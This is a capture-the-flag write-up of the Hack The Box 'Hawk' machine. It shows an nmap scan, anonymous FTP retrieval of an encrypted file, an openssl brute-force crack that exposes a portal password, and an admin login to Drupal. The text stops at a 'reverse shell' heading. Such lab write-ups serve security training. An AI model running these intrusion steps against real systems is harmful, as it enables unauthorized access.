# Hawk writeups by Seyptoo.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543657344-capture-du-2018-12-01-10-41-55.png)](https://hackthebox.eu/)

Informations
----
    Ip : 10.10.10.102       Created : mrh4sh
    Level : Easy            Base Points : 30
    
Nmap Scan
----
**We have 4 open ports, 21, 22, 80 and 8082.**
The 21 is for the FTP server, 22 for the SSH server, for the 80 HTTTP server (Drupal CMS) and finally for the 8082 for the 
database.

    root@Seyptoo:~/writeup/hawk# nmap -A -sT -p 1-65535 -oA nmap/hawk 10.10.10.102 -v
    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-01 10:50 CET
    NSE: Loaded 132 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating NSE at 10:50
    Completed NSE at 10:50, 0.00s elapsed
    Initiating NSE at 10:50
    Completed NSE at 10:50, 0.00s elapsed
    Initiating Ping Scan at 10:50
    Scanning 10.10.10.102 [4 ports]
    Completed Ping Scan at 10:50, 0.22s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 10:50
    Completed Parallel DNS resolution of 1 host. at 10:50, 0.00s elapsed
    Initiating Connect Scan at 10:50
    Scanning 10.10.10.102 [65535 ports]
    Discovered open port 21/tcp on 10.10.10.102
    Discovered open port 22/tcp on 10.10.10.102
    Discovered open port 80/tcp on 10.10.10.102
    Discovered open port 8082/tcp on 10.10.10.102
    
Check Version
----
[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543658376-capture-du-2018-12-01-10-59-23.png)](https://hackthebox.eu)
**We can see that we have 2 HTTP 
servers and an FTP server which we can 
access anonymously.**

FTP Access and transfert
----
**We have access to the FTP server, we can see that there is a hidden file and we transfer it to our physical machine.**
The file this name .drupal.txt.enc, it is probably a password to access the CMS drupal. :)

    root@Seyptoo:~/writeup/hawk# ftp 10.10.10.102
    Connected to 10.10.10.102.
    220 (vsFTPd 3.0.3)
    Name (10.10.10.102:root): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
    226 Directory send OK.
    ftp> cd messages
    250 Directory successfully changed.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    226 Directory send OK.
    ftp> ls -alv
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
    drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
    -rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
    226 Directory send OK.
    ftp> mget .drupal.txt.enc
    mget .drupal.txt.enc? 
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
    226 Transfer complete.
    240 bytes received in 0.00 secs (513.9802 kB/s)
    ftp> 

Cracking file
----
Everything is encrypted, we will use a tool to crack this file.

    root@Seyptoo:~/writeup/hawk# cat .drupal.txt.enc 
    U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
    CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
    QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
    t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
    root@Seyptoo:~/writeup/hawk# cat .drupal.txt.enc|base64 -d
    Salted__kY ԓi-6�l���7Z����>{�$�p����5 �2[
    ���������8?�sW�j#T$3AG�,f	���Z\ja�>>G6
    �.��E���ÐV��V@�����ɗ���4�����@�w�xZ��Ni��PtF��`)
    root@Seyptoo:~/writeup/hawk#
The file is in base64, we are going to the tools on github.

    root@Seyptoo:~/writeup/hawk# git clone https://github.com/deltaclock/go-openssl-bruteforce.git
    Clonage dans 'go-openssl-bruteforce'...
    remote: Enumerating objects: 31, done.
    remote: Total 31 (delta 0), reused 0 (delta 0), pack-reused 31
    Dépaquetage des objets: 100% (31/31), fait.
    Vérification de la connectivité... fait.
    root@Seyptoo:~/writeup/hawk# cd go-openssl-bruteforce/
    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# ls
    brute.go  openssl-brute  README.md
    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# ./openssl-brute -file ../drupal.txt.enc
    Bruteforcing Started
    CRACKED!! Results in file [ result-aes256 ]
    --------------------------------------------------
    Found password [ friends ] using [ aes256 ] algorithm!!
    --------------------------------------------------
    Daniel,

    Following the password for the portal:

    "PencilKeyboardScanner123"

    Please let us know when the portal is ready.

    Kind Regards,

    IT department

    --------------------------------------------------
The password has been cracked successfully, so we can connect to the CMS (drupal).

Website reverse shell
----
Try a default user, like admin and it should do the trick to connect to the CMS.
User : **admin**
Password : **PencilKeyboardScanner123**

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543661418-capture-du-2018-12-01-11-50-07.png)](https://hackthebox.eu)
